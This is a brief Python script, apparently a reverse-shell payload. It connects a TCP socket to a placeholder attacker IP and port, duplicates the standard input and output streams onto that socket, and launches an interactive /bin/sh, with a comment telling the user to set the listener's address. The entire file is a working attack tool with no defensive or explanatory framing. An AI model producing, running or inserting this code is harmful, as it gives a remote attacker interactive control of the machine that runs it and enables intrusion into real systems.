import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect((ATTACKING_IP, OPEN_PORT)) # change to IP and port that is listening to this
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p=subprocess.call(["/bin/sh","-i"])
